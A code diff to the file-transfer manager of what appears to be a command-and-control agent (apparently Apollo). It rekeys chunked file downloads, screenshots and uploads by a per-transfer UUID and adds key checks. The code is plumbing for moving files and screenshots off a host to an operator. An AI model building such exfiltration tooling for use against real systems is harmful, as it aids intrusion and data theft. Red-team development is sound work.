@@ -80,8 +80,8 @@ namespace Apollo.Management.Files
                 Statuses.Add(t);
                 if (ChunksSent == TotalChunks || t.StatusMessage == "error" || _ct.IsCancellationRequested)
                 {
-                    Complete.Set();
                     AllChunksSent?.Invoke(this, new ChunkMessageEventArgs<TaskStatus>(new TaskStatus[] { t }));
+                    Complete.Set();
                 } else
                 {
                     ChunkAdd?.Invoke(this, new ChunkMessageEventArgs<TaskStatus>(new TaskStatus[]{ t }));
@@ -99,16 +99,19 @@ namespace Apollo.Management.Files
 
         public void ProcessResponse(TaskStatus resp)
         {
-            if (_uploadMessageStore.ContainsKey(resp.TaskID))
+            if (_uploadMessageStore.ContainsKey(resp.ApolloTrackerUUID))
             {
                 // This is an upload message response, send it along.
-                if (resp.ChunkNumber > 0)
+                if (resp.ChunkNumber > 0 && _uploadMessageStore.ContainsKey(resp.ApolloTrackerUUID))
                 {
-                    _uploadMessageStore[resp.TaskID].MessageStore.AddMessage(resp);
+                    _uploadMessageStore[resp.ApolloTrackerUUID].MessageStore.AddMessage(resp);
                 }
             } else
             {
-                _downloadMessageStore[resp.TaskID].AddMessage(resp);
+                if (_downloadMessageStore.ContainsKey(resp.ApolloTrackerUUID))
+                {
+                    _downloadMessageStore[resp.ApolloTrackerUUID].AddMessage(resp);
+                }
             }
         }
 
@@ -119,58 +122,59 @@ namespace Apollo.Management.Files
             {
                 data.AddRange(Convert.FromBase64String(e.Chunks[i].ChunkData));
             }
-            if (_uploadMessageStore.TryGetValue(e.Chunks[0].TaskID, out UploadMessageTracker tracker))
+            if (_uploadMessageStore.TryGetValue(e.Chunks[0].ApolloTrackerUUID, out UploadMessageTracker tracker))
             {
                 tracker.Data = data.ToArray();
-                _uploadMessageStore[e.Chunks[0].TaskID] = tracker;
+                _uploadMessageStore[e.Chunks[0].ApolloTrackerUUID] = tracker;
                 tracker.Complete.Set();
             }
         }
 
         public bool PutFile(CancellationToken ct, string taskID, byte[] content, string originatingPath, bool isScreenshot = false, string originatingHost = null)
         {
-            lock(_downloadMessageStore)
+            string uuid = Guid.NewGuid().ToString();
+            lock (_downloadMessageStore)
             {
-                if (!_downloadMessageStore.ContainsKey(taskID))
+                if (string.IsNullOrEmpty(originatingHost))
                 {
-                    if (string.IsNullOrEmpty(originatingHost))
-                    {
-                        originatingHost = Environment.GetEnvironmentVariable("COMPUTERNAME");
-                    }
-                    _downloadMessageStore[taskID] = new DownloadMessageTracker(ct, content, _chunkSize, originatingPath, originatingHost, isScreenshot);
-                    _downloadMessageStore[taskID].ChunkAdd += DownloadChunkSent;
+                    originatingHost = Environment.GetEnvironmentVariable("COMPUTERNAME");
                 }
+                _downloadMessageStore[uuid] = new DownloadMessageTracker(ct, content, _chunkSize, originatingPath, originatingHost, isScreenshot);
+                _downloadMessageStore[uuid].ChunkAdd += DownloadChunkSent;
             }
-            _agent.GetTaskManager().AddTaskResponseToQueue(new TaskResponse()
+            TaskResponse resp = new TaskResponse
             {
                 TaskID = taskID,
                 Download = new DownloadMessage
                 {
-                    TotalChunks = _downloadMessageStore[taskID].TotalChunks,
+                    TotalChunks = _downloadMessageStore[uuid].TotalChunks,
                     FullPath = originatingPath,
                     Hostname = originatingHost,
                     IsScreenshot = isScreenshot,
-                    TaskID = taskID
-                }
-            });
+                    TaskID = taskID,
+                },
+                ApolloTrackerUUID = uuid
+            };
+            _agent.GetTaskManager()?.AddTaskResponseToQueue(resp);
             WaitHandle.WaitAny(new WaitHandle[]
             {
-                _downloadMessageStore[taskID].Complete,
+                _downloadMessageStore[uuid].Complete,
                 ct.WaitHandle
             });
-            _downloadMessageStore.TryRemove(taskID, out DownloadMessageTracker itemTracker);
+            _downloadMessageStore.TryRemove(uuid, out DownloadMessageTracker itemTracker);
             return !ct.IsCancellationRequested && itemTracker.ChunksSent == itemTracker.TotalChunks;
         }
 
         public bool GetFile(CancellationToken ct, string taskID, string fileID, out byte[] fileBytes)
         {
+            string uuid = Guid.NewGuid().ToString();
             lock(_uploadMessageStore)
             {
                 if (!_uploadMessageStore.ContainsKey(taskID))
                 {
-                    _uploadMessageStore[taskID] = new UploadMessageTracker(ct, false);
-                    _uploadMessageStore[taskID].MessageStore.ChunkAdd += MessageStore_ChunkAdd;
-                    _uploadMessageStore[taskID].MessageStore.MessageComplete += FileManager_MessageComplete;
+                    _uploadMessageStore[uuid] = new UploadMessageTracker(ct, false);
+                    _uploadMessageStore[uuid].MessageStore.ChunkAdd += MessageStore_ChunkAdd;
+                    _uploadMessageStore[uuid].MessageStore.MessageComplete += FileManager_MessageComplete;
                 }
             }
             _agent.GetTaskManager().AddTaskResponseToQueue(new TaskResponse()
@@ -182,24 +186,25 @@ namespace Apollo.Management.Files
                     FileID = fileID,
                     ChunkNumber = 1,
                     ChunkSize = _chunkSize
-                }
+                },
+                ApolloTrackerUUID = uuid
             });
             WaitHandle.WaitAny(new WaitHandle[]
             {
-                _uploadMessageStore[taskID].Complete,
+                _uploadMessageStore[uuid].Complete,
                 ct.WaitHandle
             });
             bool bRet = false;
-            if (_uploadMessageStore[taskID].Data != null)
+            if (_uploadMessageStore[uuid].Data != null)
             {
-                fileBytes = _uploadMessageStore[taskID].Data;
+                fileBytes = _uploadMessageStore[uuid].Data;
                 bRet = true;
             } else
             {
                 fileBytes = null;
                 bRet = false;
             }
-            _uploadMessageStore.TryRemove(taskID, out UploadMessageTracker _);
+            _uploadMessageStore.TryRemove(uuid, out UploadMessageTracker _);
             return bRet;
         }
 
@@ -215,7 +220,8 @@ namespace Apollo.Management.Files
                     FileID = msg.FileID,
                     ChunkNumber = msg.ChunkNumber + 1,
                     ChunkSize = _chunkSize
-                }
+                },
+                ApolloTrackerUUID = msg.ApolloTrackerUUID
             });
         }
 
@@ -231,7 +237,8 @@ namespace Apollo.Management.Files
                     FileID = tracker.FileID,
                     ChunkData = Convert.ToBase64String(tracker.Chunks[tracker.ChunksSent]),
                     TaskID = e.Chunks[0].TaskID
-                }
+                },
+                ApolloTrackerUUID = e.Chunks[0].ApolloTrackerUUID
             });
         }
 
